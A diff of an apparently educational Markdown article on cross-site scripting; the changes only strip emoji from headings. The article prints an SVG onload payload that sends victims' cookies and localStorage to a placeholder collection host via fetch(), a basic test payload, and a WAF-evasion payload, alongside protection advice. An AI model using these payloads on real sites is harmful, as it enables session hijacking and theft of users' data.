@@ -7,7 +7,7 @@ tags: ['xss', 'web-security', 'payloads', 'hacking']
 
 Cross-Site Scripting (XSS) attacks remain a pervasive threat to web application security, enabling client-side code injection and execution. This analysis dissects a potent XSS payload specifically engineered for the exfiltration of both HTTP cookies and `localStorage` data from compromised user sessions.
 
-## ☣️ The Exfiltration Payload
+## The Exfiltration Payload
 
 ```html
 <svg/onload='const url = `https://weburl/collect?cookie=${encodeURIComponent(document.cookie)}&localStorage=${encodeURIComponent(JSON.stringify(localStorage))}`; fetch(url);'>
@@ -23,7 +23,7 @@ This inline SVG-based payload, when rendered by a vulnerable web page, initiates
     * The victim's `localStorage` object, serialized to a JSON string (`JSON.stringify`) and then URL-encoded for transmission.
 4.  **Asynchronous Data Transmission**: The `fetch(url)` API asynchronously transmits an HTTP GET request containing the constructed URL and its sensitive query parameters (exfiltrated cookies and `localStorage` data) to the attacker's server. This occurs without page reload, making the attack highly stealthy.
 
-## 🚨 Consequences of Successful Exploitation
+## Consequences of Successful Exploitation
 
 A successful XSS attack leveraging such a payload can lead to severe security breaches:
 
@@ -31,12 +31,12 @@ A successful XSS attack leveraging such a payload can lead to severe security br
 * **Persistent Data Compromise**: The compromise of `localStorage` allows attackers to steal cached Personally Identifiable Information (PII), application-specific settings, API keys, or JWTs (if stored insecurely client-side), leading to privacy violations and potential further exploitation.
 * **Privilege Escalation**: By impersonating privileged users, attackers can potentially escalate their access rights within the application.
 
-## 🧪 Advanced XSS Techniques & Testing
+## Advanced XSS Techniques & Testing
 
 * **Vulnerability Testing**: Developers should proactively test for XSS by injecting common payloads into all user-controlled input fields (e.g., email, search queries, comments). A basic test payload such as `test@gmail.com'%22%3E%3Csvg/onload=alert(/xss/)%3E` can reveal client-side execution.
 * **WAF Evasion**: Adversaries continuously innovate techniques to bypass Web Application Firewalls (WAFs) and sanitize filters. Examples include character encoding, HTML entity obfuscation, tag attribute manipulation, and JavaScript context breaking. The provided location concatenation payload `"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">"` demonstrates a complex evasion strategy utilizing `onbeforescriptexecute` (a deprecated event handler) and character concatenation to reconstruct malicious JavaScript.
 
-## 🔒 Robust Protection Measures
+## Robust Protection Measures
 
 Mitigating XSS vulnerabilities requires a multi-layered defense strategy deeply integrated into the Software Development Life Cycle (SDLC):
 
